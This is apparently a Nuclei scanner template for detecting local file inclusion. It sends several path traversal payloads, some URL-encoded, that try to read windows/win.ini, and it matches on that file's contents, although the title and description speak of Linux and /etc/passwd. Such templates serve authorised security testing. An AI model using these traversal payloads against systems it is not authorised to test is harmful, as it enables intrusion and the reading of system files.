id: linux-lfi-fuzzing
info:
  author: geeknik,unstabl3,pentest_swissky,sushantkamble,0xSmiley
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-200
  description: Multiple fuzzes for /etc/passwd on passed URLs were conducted, leading
    to multiple instances of local file inclusion vulnerability.
  metadata:
    max-request: 22
  name: Linux - Local File Inclusion Fuzzing
  severity: high
  tags: linux,lfi,fuzz,fuzzing,vuln
---
http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - bit app support
    - fonts
    - extensions
  method: GET
  path:
  - '{{BaseURL}}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini'
  - '{{BaseURL}}/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/windows/win.ini'
  - '{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini'
  - '{{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini'
  - '{{BaseURL}}/../../../../../../windows/win.ini'
  stop-at-first-match: true
